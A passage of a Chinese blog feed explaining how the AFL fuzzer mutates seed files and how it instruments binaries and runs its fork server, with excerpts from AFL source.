class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Length limits for auto-detected dictionary tokens: *&#x2F;</span><br><span class="line"></span><br><span class="line">#define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 </span><br><span class="line">&#x2F;* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. *&#x2F;</span><br><span class="line"></span><br><span class="line">#define USE_AUTO_EXTRAS 10 </span><br><span class="line">#define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10)</span><br></pre></td></tr></table></figure><p>对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改<code>MAX_AUTO_EXTRA</code>为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。</p><h2 id="生成effector-map"><a href="#生成effector-map" class="headerlink" title="生成effector map"></a>生成effector map</h2><p>在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。</p><p>具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</p><p>这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p><p>由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。</p><p>不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Minimum input file length at which the effector logic kicks in: *&#x2F;</span><br><span class="line"></span><br><span class="line">#define EFF_MIN_LEN 128 </span><br><span class="line">&#x2F;* Maximum effector density past which everything is just fuzzed unconditionally (%): *&#x2F;</span><br><span class="line"></span><br><span class="line">#define EFF_MAX_PERC 90</span><br></pre></td></tr></table></figure><p>即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。</p><h1 id="arithmetic"><a href="#arithmetic" class="headerlink" title="arithmetic"></a>arithmetic</h1><p>在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段：</p><ul><li>arith 8/8，每次对<strong>8</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li><li>arith 16/8，每次对<strong>16</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个word进行整数加减变异</li><li>arith 32/8，每次对<strong>32</strong>个bit进行加减运算，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li></ul><p>加减变异的上限，在<code>config.h</code>中的宏<code>ARITH_MAX</code>定义，默认为35。所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。</p><p>此外，AFL还会智能地跳过某些arithmetic变异。第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p><h1 id="interest"><a href="#interest" class="headerlink" title="interest"></a>interest</h1><p>下一个阶段是interest，具体可分为：</p><ul><li>interest 8/8，每次对<strong>8</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对<strong>16</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对<strong>32</strong>个bit进替换，按照每<strong>8</strong>个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>而用于替换的”interesting values”，是AFL预设的一些比较特殊的数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static s8  interesting_8[]  &#x3D; &#123; INTERESTING_8 &#125;;</span><br><span class="line">static s16 interesting_16[] &#x3D; &#123; INTERESTING_8, INTERESTING_16 &#125;;</span><br><span class="line">static s32 interesting_32[] &#x3D; &#123; INTERESTING_8, INTERESTING_16, INTERESTING_32 &#125;;</span><br></pre></td></tr></table></figure><p>这些数的定义在<code>config.h</code>文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* List of interesting values to use in fuzzing. *&#x2F;</span><br><span class="line"></span><br><span class="line">#define INTERESTING_8 \ -128, &#x2F;* Overflow signed 8-bit when decremented *&#x2F; \ -1, &#x2F;* *&#x2F; \ 0, &#x2F;* *&#x2F; \ 1, &#x2F;* *&#x2F; \ 16, &#x2F;* One-off with common buffer size *&#x2F; \ 32, &#x2F;* One-off with common buffer size *&#x2F; \ 64, &#x2F;* One-off with common buffer size *&#x2F; \ 100, &#x2F;* One-off with common buffer size *&#x2F; \ 127 &#x2F;* Overflow signed 8-bit when incremented *&#x2F; </span><br><span class="line">#define INTERESTING_16 \ -32768, &#x2F;* Overflow signed 16-bit when decremented *&#x2F; \ -129, &#x2F;* Overflow signed 8-bit *&#x2F; \ 128, &#x2F;* Overflow signed 8-bit *&#x2F; \ 255, &#x2F;* Overflow unsig 8-bit when incremented *&#x2F; \ 256, &#x2F;* Overflow unsig 8-bit *&#x2F; \ 512, &#x2F;* One-off with common buffer size *&#x2F; \ 1000, &#x2F;* One-off with common buffer size *&#x2F; \ 1024, &#x2F;* One-off with common buffer size *&#x2F; \ 4096, &#x2F;* One-off with common buffer size *&#x2F; \ 32767 &#x2F;* Overflow signed 16-bit when incremented *&#x2F; </span><br><span class="line">#define INTERESTING_32 \ -2147483648LL, &#x2F;* Overflow signed 32-bit when decremented *&#x2F; \ -100663046, &#x2F;* Large negative number (endian-agnostic) *&#x2F; \ -32769, &#x2F;* Overflow signed 16-bit *&#x2F; \ 32768, &#x2F;* Overflow signed 16-bit *&#x2F; \ 65535, &#x2F;* Overflow unsig 16-bit when incremented *&#x2F; \ 65536, &#x2F;* Overflow unsig 16 bit *&#x2F; \ 100663045, &#x2F;* Large positive number (endian-agnostic) *&#x2F; \ 2147483647 &#x2F;* Overflow signed 32-bit when incremented *&#x2F;</span><br></pre></td></tr></table></figure><p>可以看到，用于替换的基本都是可能会造成溢出的数。</p><p>与之前类似，effector map仍然会用于判断是否需要变异；此外，如果某个interesting value，是可以通过bitflip或者arithmetic变异达到，那么这样的重复性变异也是会跳过的。</p><h1 id="dictionary"><a href="#dictionary" class="headerlink" title="dictionary"></a>dictionary</h1><p>进入到这个阶段，就接近deterministic fuzzing的尾声了。具体有以下子阶段：</p><ul><li>user extras (over)，从头开始，将<strong>用户提供</strong>的tokens依次<strong>替换</strong>到原文件中</li><li>user extras (insert)，从头开始，将<strong>用户提供</strong>的tokens依次<strong>插入</strong>到原文件中</li><li>auto extras (over)，从头开始，将<strong>自动检测</strong>的tokens依次<strong>替换</strong>到原文件中</li></ul><p>其中，用户提供的tokens，是在词典文件中设置并通过<code>-x</code>选项指定的，如果没有则跳过相应的子阶段。</p><h2 id="user-extras-over"><a href="#user-extras-over" class="headerlink" title="user extras (over)"></a>user extras (over)</h2><p>对于用户提供的tokens，AFL先按照长度从小到大进行排序。这样做的好处是，只要按照顺序使用排序后的tokens，那么后面的token不会比之前的短，从而每次覆盖替换后不需要再恢复到原状。</p><p>随后，AFL会检查tokens的数量，如果数量大于预设的<code>MAX_DET_EXTRAS</code>（默认值为200），那么对每个token会根据概率来决定是否进行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for (j &#x3D; 0; j &lt; extras_cnt; j++) &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Skip extras probabilistically if extras_cnt &gt; MAX_DET_EXTRAS. Also skip them if there&#39;s no room to insert the payload, if the token is redundant, or if its entire span has no bytes set in the effector map. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; UR(extras_cnt) &gt;&#x3D; MAX_DET_EXTRAS) ||</span><br><span class="line">      extras[j].len &gt; len - i ||</span><br><span class="line">      !memcmp(extras[j].data, out_buf + i, extras[j].len) ||</span><br><span class="line">      !memchr(eff_map + EFF_APOS(i), 1, EFF_SPAN_ALEN(i, extras[j].len))) &#123;</span><br><span class="line"></span><br><span class="line">    stage_max--;</span><br><span class="line">    continue;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>UR(extras_cnt)</code>是运行时生成的一个<code>0</code>到<code>extras_cnt</code>之间的随机数。所以，如果用户词典中一共有400个tokens，那么每个token就有<code>200/400=50%</code>的概率执行替换变异。我们可以修改<code>MAX_DET_EXTRAS</code>的大小来调整这一概率。</p><p>由上述代码也可以看到，effector map在这里同样被使用了：如果要替换的目标bytes全部是“无效”的，那么就跳过这一段，对下一段目标执行替换。</p><h2 id="user-extras-insert"><a href="#user-extras-insert" class="headerlink" title="user extras (insert)"></a>user extras (insert)</h2><p>这一子阶段是对用户提供的tokens执行插入变异。不过与上一个子阶段不同的是，此时并没有对tokens数量的限制，所以全部tokens都会从原文件的第1个byte开始，依次向后插入；此外，由于原文件并未发生替换，所以effector map不会被使用。</p><p>这一子阶段最特别的地方，就是变异不能简单地恢复。之前每次变异完，在变异位置处简单取逆即可，例如bitflip后，再进行一次同样的bitflip就恢复为原文件。正因为如此，之前的变异总体运算量并不大。</p><p>但是，对于<strong>插入</strong>这种变异方式，恢复起来则复杂的多，所以AFL采取的方式是：将原文件分割为插入前和插入后的部分，再加上插入的内容，将这3部分依次复制到目标缓冲区中（当然这里还有一些小的优化，具体可阅读代码）。而对每个token的每处插入，都需要进行上述过程。所以，如果用户提供了大量tokens，或者原文件很大，那么这一阶段的运算量就会非常的多。直观表现上，就是AFL的执行状态栏中，”user extras (insert)”的总执行量很大，执行时间很长。如果出现了这种情况，那么就可以考虑适当删减一些tokens。</p><h2 id="auto-extras-over"><a href="#auto-extras-over" class="headerlink" title="auto extras (over)"></a>auto extras (over)</h2><p>这一项与”user extras (over)”很类似，区别在于，这里的tokens是最开始bitflip阶段自动生成的。另外，自动生成的tokens总量会由<code>USE_AUTO_EXTRAS</code>限制（默认为10）。</p><h1 id="havoc"><a href="#havoc" class="headerlink" title="havoc"></a>havoc</h1><p>对于非dumb mode的主fuzzer来说，完成了上述deterministic fuzzing后，便进入了充满随机性的这一阶段；对于dumb mode或者从fuzzer来说，则是直接从这一阶段开始。</p><p>havoc，顾名思义，是充满了各种随机生成的变异，是对原文件的“大破坏”。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul><p>怎么样，看完上面这么多的“随机”，有没有觉得晕？还没完，AFL会生成一个随机数，作为变异组合的数量，并根据这个数量，每次从上面那些方式中随机选取一个（可以参考高中数学的有放回摸球），依次作用到文件上。如此这般丧心病狂的变异，原文件就大概率面目全非了，而这么多的随机性，也就成了fuzzing过程中的不可控因素，即所谓的“看天吃饭”了。</p><h1 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h1><p>历经了如此多的考验，文件的变异也进入到了最后的阶段：splice。如其意思所说，splice是将两个seed文件拼接得到新的文件，并对这个新文件继续执行havoc变异。</p><p>具体地，AFL在seed文件队列中随机选取一个，与当前的seed文件做对比。如果两者差别不大，就再重新随机选一个；如果两者相差比较明显，那么就随机选取一个位置，将两者都分割为头部和尾部。最后，将当前文件的头部与随机文件的尾部拼接起来，就得到了新的文件。在这里，AFL还会过滤掉拼接文件未发生变化的情况。</p><h1 id="cycle"><a href="#cycle" class="headerlink" title="cycle"></a>cycle</h1><p>于是乎，一个seed文件，在上述的全部变异都执行完成后，就…抱歉，还没结束。</p><p>上面的变异完成后，AFL会对文件队列的下一个进行变异处理。当队列中的全部文件都变异测试后，就完成了一个”cycle”，这个就是AFL状态栏右上角的”cycles done”。而正如cycle的意思所说，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。</p><p>当然，如果用户不停止AFL，那么seed文件将会一遍遍的变异下去。</p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL细节小计</title>
      <link href="posts/53fcd800/"/>
      <url>posts/53fcd800/</url>
      
        <content type="html"><![CDATA[<h1 id="覆盖率"><a href="#覆盖率" class="headerlink" title="覆盖率"></a>覆盖率</h1><p>代码覆盖率，是一种通过计算测试过程中被执行的源代码占全部源代码的比例，进而间接度量软件质量的方法。其计量方式很多，但无论是 GCC 的 GCOV 还是 LLVM 的 SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测。</p><h2 id="函数（Fuction-Level）"><a href="#函数（Fuction-Level）" class="headerlink" title="函数（Fuction-Level）"></a><strong>函数（Fuction-Level）</strong></h2><p>函数就是代码执行时调用到哪些函数，但是函数里面的具体代码行却不作统计，相对比较粗糙但高效的统计方式。所以，通常的统计方式是用基本块，简称BB。</p><h2 id="基本块（BasicBlock-Level）"><a href="#基本块（BasicBlock-Level）" class="headerlink" title="基本块（BasicBlock-Level）"></a><strong>基本块（BasicBlock-Level）</strong></h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210413173114.png" alt="image-20210413173114591"></p><p>IDA中每一块代码就代表着一个基本块，就是以指令跳转为作划分界限的。</p><h2 id="边界（Edge-Level）"><a href="#边界（Edge-Level）" class="headerlink" title="边界（Edge-Level）"></a><strong>边界（Edge-Level）</strong></h2><p>edge本身就涵盖了基本块部分，唯一的差别是edge多记录了一些执行边界的信息。</p><p>我们可以将程序看成一个控制流图（CFG），图的每个节点表示一个基本块，而edge就被用来表示在基本块之间的转跳。知道了每个基本块和跳转的执行次数，就可以知道程序中的每个语句和分支的执行次数，从而获得比记录BB更细粒度的覆盖率信息。</p><p>具体到AFL的实现中，使用二元组(branch_src, branch_dst)来记录<strong>当前基本块</strong> + <strong>前一基本块</strong> 的信息，从而获取目标的执行流程和代码覆盖情况，下文会详细介绍。</p><h1 id="代码插桩"><a href="#代码插桩" class="headerlink" title="代码插桩"></a>代码插桩</h1><p><code>afl</code>插桩的代码写在<code>afl-gcc.c</code>里面，afl-gcc 是 gcc 的一个封装(wrapper)。主要实现的下述的三个功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find_as(argv[<span class="number">0</span>]);                         <span class="comment">//找到gcc/clang/llvm编译器</span></span><br><span class="line">edit_params(argc, argv);                  <span class="comment">//设置cc的参数</span></span><br><span class="line">execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);  <span class="comment">//执行</span></span><br></pre></td></tr></table></figure><p>我们在 <code>execvp</code>之前，加入一段代码打印出<code>cc_params</code>的参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$:./afl-gcc demo.c -o <span class="built_in">test</span>                                                                                                    </span><br><span class="line">afl-cc 2.52b by &lt;lcamtuf@google.com&gt;</span><br><span class="line">        arg0: gcc</span><br><span class="line">        arg1: demo.c</span><br><span class="line">        arg2: -o</span><br><span class="line">        arg3: <span class="built_in">test</span></span><br><span class="line">        arg4: -B</span><br><span class="line">        arg5: .</span><br><span class="line">        arg6: -g</span><br><span class="line">        arg7: -O3</span><br><span class="line">        arg8: -funroll-loops</span><br><span class="line">        arg9: -D__AFL_COMPILER=1</span><br><span class="line">        arg10: -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span><br></pre></td></tr></table></figure><p>我们知道一个二进制文件完整的流程是：预处理 -&gt; 编译 -&gt; 汇编 -&gt; 链接。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是<code>as</code>。编译完成<code>AFL</code>后，在其目录下也会存在一个<code>as</code>文件，并作为符号链接指向<code>afl-as</code>。所以，如果通过<code>-B</code>选项为<code>gcc</code>设置了搜索路径(根据gcc –help可知)，那么<code>afl-as</code>便会作为汇编器，执行实际的汇编操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-funroll-loops     ：执行循环强度消除并消除在循环内部使用的变量。这是用简单而快速的操作（如加法和减法）替代耗时操作（如乘法和除法）的过程</span><br><span class="line">-B &lt; &gt;             ：设置编译器的搜索路径。</span><br><span class="line">ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION     &#x2F;* a flag also shared with libfuzzer) or *&#x2F;</span><br><span class="line">ifdef __AFL_COMPILER                             &#x2F;* (this one is just for AFL). *&#x2F;</span><br></pre></td></tr></table></figure><p>反汇编我们刚刚所编译出来的 test 文件可以发现其中多了一些汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400860</span><br><span class="line">.text:0000000000400860 argc &#x3D; rdi                              ; int</span><br><span class="line">.text:0000000000400860 argv &#x3D; rsi                              ; char **</span><br><span class="line">.text:0000000000400860 ; __unwind &#123;</span><br><span class="line">.text:0000000000400860                 lea     rsp, [rsp-98h]</span><br><span class="line">.text:0000000000400868                 mov     [rsp+98h+var_98], rdx</span><br><span class="line">.text:000000000040086C                 mov     [rsp+98h+var_90], rcx</span><br><span class="line">.text:0000000000400871                 mov     [rsp+98h+var_88], rax</span><br><span class="line">.text:0000000000400876                 mov     rcx, 459Eh</span><br><span class="line">.text:000000000040087D                 call    __afl_maybe_log</span><br><span class="line">.text:0000000000400882                 mov     rax, [rsp+98h+var_88]</span><br><span class="line">.text:0000000000400887                 mov     rcx, [rsp+98h+var_90]</span><br><span class="line">.text:000000000040088C                 mov     rdx, [rsp+98h+var_98]</span><br><span class="line">.text:0000000000400890                 lea     rsp, [rsp+98h]</span><br></pre></td></tr></table></figure><p>阅读<code>afl-as.c</code>发现插桩完成在 <code>add_instrumentation</code>函数内部</p><blockquote><p><code>fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</code></p></blockquote><p>这里 afl 通过调用 fprintf 将 trampoline_fmt_64 或者 trampoline_fmt_32 插入目标的代码段，以完成插桩来计算代码覆盖率。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-as.h</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal -16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edi,  0(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edx,  4(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%ecx,  8(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%eax, 12(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl $0x%08x, %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl 12(%%esp), %%eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  8(%%esp), %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  4(%%esp), %%edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  0(%%esp), %%edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal 16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到插桩主要完成了（x64）：</p><ul><li>保存<code>rax</code> <code>rcx</code> <code>rdx</code> 等寄存器的值</li><li>将<code>ecx</code>的值设置为随机数</li><li>调用<code>__afl_maybe_log</code></li><li>恢复原寄存器的数据</li></ul><p>关于<code>&quot;movq $0x%08x, %%rcx\n&quot;</code>这条汇编代码其对应<code>fprintf</code>中的参数为<code>R(MAP_SIZE)</code>，根据定义，宏<code>MAP_SIZE</code>为64K；<code>R(x)</code>的定义是<code>(random() % (x))</code>，所以<code>R(MAP_SIZE)</code>即为0到MAP_SIZE之间的一个随机数。这里的R(x)实际上是用来区分每个代码块的，也就是是一个标识。</p><p>关于<code>__afl_maybe_log()</code>的详细实现会在下文提及。</p><h1 id="fork-server"><a href="#fork-server" class="headerlink" title="fork server"></a>fork server</h1><p>afl 的流程大致是：对输入的样本文件不断地变异，并将这些 mutated input 喂给 loader 执行，检查是否会造成崩溃。因此，fuzzing 涉及到大量的 fork 和执行 loader 的过程。但是对于简单的库，我们会花费大量时间去等待<code>execve()</code>，载入目标文件和库、解析符号地址等，为了避免这种情况，AFL实现了一套 fork server 机制。其基本思路是：启动target进程后，target会运行一个fork server；fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作。</p><h2 id="init-fork-server"><a href="#init-fork-server" class="headerlink" title="init fork server"></a>init fork server</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">init_forkserver</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">it</span>;</span></span><br><span class="line">  <span class="keyword">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>]; <span class="comment">//建立管道st_pipe和ctl_pipe，在父子进程之间，是通过管道进行通信，一个用于传递状态，另一个用于传递命令。</span></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  forksrv_pid = fork();        <span class="comment">//fork 出来一个子进程，父子进程之间通过管道进行通信。</span></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  <span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/* Set up control and status pipes, close the unneeded original fds. */</span></span><br><span class="line">    <span class="keyword">if</span> (dup2(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);    <span class="comment">//对于子进程（fork server），会进行一系列设置，其中包括将上述两个管道分配到预先指定的fd，并最终执行target：</span></span><br><span class="line">    <span class="keyword">if</span> (dup2(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line">...</span><br><span class="line">    execv(target_path, argv);</span><br><span class="line">    <span class="comment">/* Use a 